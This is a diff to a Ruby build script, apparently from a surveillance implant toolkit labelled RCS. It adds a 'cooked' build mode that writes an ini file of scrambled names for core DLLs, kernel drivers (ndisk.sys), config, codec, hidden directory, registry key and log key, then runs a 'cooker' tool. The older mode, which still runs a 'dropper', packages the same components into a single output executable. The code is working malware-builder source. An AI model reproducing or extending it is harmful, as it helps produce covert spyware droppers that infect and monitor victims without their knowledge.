@@ -69,18 +69,44 @@ class BuildWindows < Build
       executable = path('input')
     end
 
-    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
-                                        path(@scrambled[:core64])+' '+
-                                        path(@scrambled[:config])+' '+
-                                        path(@scrambled[:driver])+' '+
-                                        path(@scrambled[:driver64])+' '+
-                                        path(@scrambled[:codec])+' '+
-                                        @scrambled[:dir]+' '+
-                                        manifest +' '+
-                                        executable + ' ' +
-                                        path('output')
+    if params['cooked'] == true
 
-    File.exist? path('output') || raise("output file not created by dropper")
+      key = @factory.logkey.chr.ord
+      key = "%02X" % ((key > 127) ? (key - 256) : key)
+
+      # write the ini file
+      File.open(path('cooker.ini'), 'w') do |f|
+        f.puts "[RCS]"
+        f.puts "HUID=#{@factory.ident}"
+        f.puts "HCORE=#{@scrambled[:core]}"
+        f.puts "HCONF=#{@scrambled[:config]}"
+        f.puts "CODEC=#{@scrambled[:codec]}"
+        f.puts "HDRV=#{@scrambled[:driver]}"
+        f.puts "DLL64=#{@scrambled[:core64]}"
+        f.puts "DRIVER64=#{@scrambled[:driver64]}"
+        f.puts "HDIR=#{@scrambled[:dir]}"
+        f.puts "HREG=#{@scrambled[:reg]}"
+        f.puts "HSYS=ndisk.sys"
+        f.puts "HKEY=#{key}"
+        f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
+      end
+
+      CrossPlatform.exec path('cooker'), '-C -R ' + path('') + ' -O ' + path('output')
+
+    else
+      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
+                                          path(@scrambled[:core64])+' '+
+                                          path(@scrambled[:config])+' '+
+                                          path(@scrambled[:driver])+' '+
+                                          path(@scrambled[:driver64])+' '+
+                                          path(@scrambled[:codec])+' '+
+                                          @scrambled[:dir]+' '+
+                                          manifest +' '+
+                                          executable + ' ' +
+                                          path('output')
+    end
+    
+    File.exist? path('output') || raise("output file not created")
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
